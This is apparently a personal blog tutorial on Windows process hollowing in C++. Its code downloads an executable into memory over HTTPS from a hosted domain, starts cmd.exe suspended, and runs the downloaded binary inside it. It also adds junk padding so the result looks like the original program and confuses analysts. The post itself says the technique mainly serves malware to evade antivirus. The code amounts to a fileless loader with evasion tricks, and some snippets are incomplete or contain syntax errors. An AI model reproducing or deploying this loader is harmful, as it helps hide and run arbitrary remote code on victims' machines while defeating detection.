{
    "title": "Process Hollowing",
    "description": "Streaming and executing binary code securely",
    "tags": ["Hacking", "Windows", "C++"],
    "author": "Noah",
    "date": "1/13/2023",
    "showTitle": true,
    "indexed": true,
    "pinned": false
}
### Introduction
Process hollowing is a technique to run executable, binary code, while disguised as a different process. It is mainly used by malware to replace the code of a running, trusted program with its own, making it very difficult to detect. Although its main use is to evade detection by anti-viruses, process hollowing also has a legitimate use.

> More information about process hollowing can be found at [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)

We can use process hollowing to download and run an executable without reading or writing to the disk, which is very useful in preventing reverse-engineering of our code.

### Downloading Binary
We will use `WinHTTP` to download a file from the internet into a temporary buffer.

First, we open an `HINTERNET` session object and initialize its connection to the domain our binaries are stored on.

    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnection = WinHttpConnect(hSession, DOWNLOAD_DOMAIN, (DOWNLOAD_USE_HTTPS ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT), 0);

Here, `USER_AGENT` is defined as a default User Agent (`Mozilla/5.0 (X11;...`) and `DOWNLOAD_DOMAIN` is the domain where our binaries are hosted (`strayfade.com` in this case)
`DOWNLOAD_USE_HTTPS` is defined as `true` so that we connect on port 443 which is used for HTTPS.

    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", DOWNLOAD_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

 - `L"GET"` tells WinHTTP to create a `GET` request
 - `DOWNLOAD_PATH` is the path of the binaries on the server (`/cdn/file.exe`)
 - `WINHTTP_DEFAULT_ACCEPT_TYPES` tells WinHTTP to accept binary data.
 - `WINHTTP_FLAG_SECURE` tells WinHTTP that this data is served over HTTPS.

This code sends the request and reads the response into the `hRequest` variable. Below, we get the size of the transferred data to allocate memory for it.

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    WinHttpReceiveResponse(hRequest, NULL)

    DWORD contentLength = 0;
    DWORD contentLengthBufferSize = 128;
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &contentLength, &contentLengthBufferSize, WINHTTP_NO_HEADER_INDEX)
    unsigned char* buffer = new unsigned char[contentLength];

Next, we have to read the response into the array
            
    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, (LPVOID)buffer, contentLength, &bytesRead);

### Creating a process
> I learned about most of this from the [adamhlt/Process-Hollowing](https://github.com/adamhlt/Process-Hollowing) repository on GitHub, so credit goes to them for some bits of this code.

First, we have to create a dummy process to be "hollowed":

    CreateProcessA((LPSTR)HOST_PROCESS, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);

What's important here is the `HOST_PROCESS` variable and `CREATE_SUSPENDED` flag. `HOST_PROCESS` is a path (string) to the executable to hollow. For our use, this is set to the absolute path of `cmd.exe`. The `CREATE_SUSPENDED` flag tells `CreateProcessA` to suspend the process as soon as it is created, letting us replace its PE image before it starts.

We also need to check whether or not the running executable is compatible (has the same architecture as our replacement code). To do this, I'm using functions from the `Process-Hollowing` repository:

    bool bTarget32;
    IsWow64Process(PI.hProcess, &bTarget32);
    ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
    ProcessAddressInformation = GetProcessAddressInformation64(&PI); // Get base address of process to hollow
    const bool bSource32 = IsPE32(hFileContent); // hFileContent is a cast of buffer to type LPVOID

    DWORD dwSourceSubsystem = GetSubsytem64(hFileContent);
    DWORD dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
    if (dwSourceSubsystem != dwTargetSubsystem) 
        return;

Finally, we do the actual process hollowing

    bool bHasReloc = HasRelocation64(hFileContent);
    if (!bHasReloc) 
        RunPE64(&PI, hFileContent); 
    else 
        RunPEReloc64(&PI, hFileContent); 

### More Important Things
One neat thing we can do to confuse reverse-engineerers is to pad our executable with junk code, since the whole program only ends up at about 16kb. There aren't many programs that small, so we need to add junk code to make our process hollowing look like it's just running the original program. I added 2mb of filler to the program, since the binaries we were downloading were around that size.

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Pad, 0, 0, 0); // This runs in a thread after the process hollowing has finished.

### References 
 - [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)
 - [https://github.com/adamhlt/Process-Hollowing](https://github.com/adamhlt/Process-Hollowing)
 - [https://github.com/kernelm0de/RunPE-ProcessHollowing](https://github.com/kernelm0de/RunPE-ProcessHollowing)